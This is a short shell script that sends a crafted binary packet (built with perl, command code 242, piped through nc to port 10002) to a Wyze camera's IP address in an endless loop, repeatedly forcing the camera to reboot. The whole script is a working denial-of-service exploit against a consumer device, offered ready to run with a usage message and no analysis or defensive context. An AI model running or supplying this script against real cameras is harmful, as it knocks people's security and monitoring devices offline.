#!/bin/sh
# Force the camera to reboot remotely
if [ "$#" -ne 1 ]; then
	echo "Usage: $0 <wyze_ip_address>"
	exit 1
fi
echo Repeatedly force reboot on $1...
while true
do
	perl -e '$cmd=pack("v", 242); $len=pack("v", 32); printf "ICAM" . "$cmd" . "\x0f"x9 . pack("C", 24) . "\x00"x3 . "\x0a"x40 . "\x0b"x4' . "\x0c"x55 | nc $1 10002 -q 0 | hd
done
